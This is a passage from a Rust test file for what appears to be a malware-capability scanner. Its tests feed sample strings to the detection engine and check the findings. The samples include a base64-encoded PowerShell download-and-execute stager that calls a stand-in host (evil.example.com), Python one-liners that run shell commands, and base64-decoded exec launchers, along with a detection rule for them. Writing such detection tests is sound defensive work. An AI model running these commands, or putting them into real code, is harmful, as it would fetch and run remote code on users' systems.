    let ps_code =
        "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
    let utf16le: Vec<u8> = ps_code.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16le);
    let ps = format!("powershell.exe -EncodedCommand {b64}\n");
    let info = make_string_info(&ps);
    let engine = test_mapper();
    let (with_scan, _) = process_all_strings(
        "stager.ps1",
        std::slice::from_ref(&info),
        &engine,
        0,
        None,
        None,
    );
    let (skipped, _) =
        process_all_strings_with_host("stager.ps1", &[info], &engine, 0, None, None, true, None);
    assert!(
        with_scan.iter().any(|file| {
            file.findings
                .iter()
                .any(|finding| finding.id.contains("base64-powershell"))
        }),
        "fallback EncodedCommand scan should still fire for binary/generic hosts"
    );
    assert!(
        skipped.iter().all(|file| {
            file.findings
                .iter()
                .all(|finding| !finding.id.contains("base64-powershell"))
        }),
        "unified source path must not re-scan EncodedCommand"
    );
}

#[test]
fn yara_signature_strings_do_not_become_program_layers() {
    use base64::Engine;
    let code = "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
    let wide: Vec<u8> = code.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let encoded = base64::engine::general_purpose::STANDARD.encode(wide);
    let info = make_string_info(&format!("powershell.exe -EncodedCommand {encoded}\n"));
    let engine = test_mapper();
    let (binary_layers, _) = process_all_strings(
        "payload.bin",
        std::slice::from_ref(&info),
        &engine,
        0,
        Some(&FileType::Data),
        None,
    );
    assert!(
        !binary_layers.is_empty(),
        "opaque payload analysis must remain enabled"
    );
    let (yara_layers, yara_findings) = process_all_strings(
        "signature.yar",
        &[info],
        &engine,
        0,
        Some(&FileType::Yara),
        None,
    );
    assert!(yara_layers.is_empty());
    assert!(yara_findings.is_empty());
}

#[test]
#[allow(clippy::expect_used)]
fn test_extract_inline_interpreter_code_python3() {
    let host = "#!/bin/sh\npython3 -c \"import os, sys; os.system('id'); print(sys.version)\"\n";
    let (lang, code) =
        extract_inline_interpreter_code(host).expect("python3 -c body should unwrap");
    assert_eq!(lang, FileType::Python);
    assert!(code.contains("os.system"));
}

#[test]
fn test_extract_windows_interpreter_inline_code() {
    let command = r#"python.exe -c \"import base64; exec(base64.b64decode(data))\""#;
    let command = command.replace("\\\"", "\"");
    let Some((lang, code)) = extract_inline_interpreter_code(&command) else {
        panic!("Windows interpreter should unwrap");
    };
    assert_eq!(lang, FileType::Python);
    assert!(code.contains("base64.b64decode"));
}

#[test]
fn windows_inline_python_is_not_heuristic_quoted_source() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("traits.yaml");
    std::fs::write(
        &path,
        r#"
defaults:
  for: [python]
  platforms: [unix, windows]
traits:
  - id: test/source::base64-exec
    desc: Inline Base64 execution
    crit: notable
    if:
      type: symbol
      kind: call
      exact: exec
      arg:
        index: 0
        from: {call: '(^|\.)b64decode$'}
    unless:
      - id: metadata/lang/source/origin::heuristic-quoted-source
"#,
    )
    .unwrap();
    let mapper = crate::capabilities::CapabilityMapper::from_yaml(&path).unwrap();
    let engine = crate::Engine::from_rules(std::sync::Arc::new(mapper));
    let host = r#"@echo off
python.exe -c "import base64; exec(base64.b64decode(open('x').read()))"
"#;
    let (_, findings) = process_all_strings_with_host(
        "launcher.bat",
        &[],
        &engine,
        0,
        Some(&FileType::Batch),
        None,
        true,
        Some(host),
    );
    assert!(
        findings.iter().any(|f| f.id == "test/source::base64-exec"),
        "{findings:?}"
    );
    let extracted = make_string_info(
        r#"python.exe -c "import base64; exec(base64.b64decode(open('x').read()))""#,
    );
    let (_, findings) = process_all_strings(
        "launcher.bat",
        &[extracted],
        &engine,
        0,
        Some(&FileType::Batch),
        None,
    );
    assert!(
        findings.iter().any(|f| f.id == "test/source::base64-exec"),
        "extracted: {findings:?}"
    );
}

#[test]
fn test_host_plain_unwraps_inline_python_in_shell() {
    // Source files keep the full-file haystack, so `python3 -c` inside a
    // shell script is still unwrapped (identity-command-python-call).
    let host = concat!(
        "#!/bin/sh\n",
        "python3 -c \"import os, sys; os.system('id'); print(sys.version)\"\n",
    );
    let engine = test_mapper();
    let (_layers, findings) = process_all_strings_with_host(
        "wrapper.sh",
        &[],
        &engine,
        0,
        Some(&FileType::Shell),
        None,
        true,
        Some(host),
    );
    assert!(
        findings
            .iter()
            .any(|f| f.id == "metadata/lang/embedded::python"),
        "HostPlain shell must still unwrap python3 -c; got {:?}",
        findings.iter().map(|f| &f.id).collect::<Vec<_>>(),
    );
}
